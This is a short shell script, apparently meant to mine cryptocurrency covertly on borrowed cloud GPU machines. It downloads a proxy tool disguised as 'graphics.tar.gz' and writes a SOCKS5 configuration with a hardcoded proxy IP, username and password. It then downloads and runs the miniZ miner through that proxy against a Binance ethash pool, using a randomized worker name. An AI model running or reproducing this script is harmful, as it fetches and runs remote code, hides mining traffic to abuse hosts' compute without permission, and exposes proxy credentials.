sudo apt-get update -y
wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.140.13.119:9132
socks5_username = vxlioevw
socks5_password = 6mwu65u0aq80
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y2/miniZ_v1.8y2_linux-x64.tar.gz 
tar xf miniZ_v1.8y2_linux-x64.tar.gz 

chmod +x miniZ

./graftcp/graftcp ./miniZ -u teguhcong.$(echo $(shuf -i 1-999 -n 1)-T4) -l ethash.poolbinance.com --port=443 -p x --par=ethash --pers auto
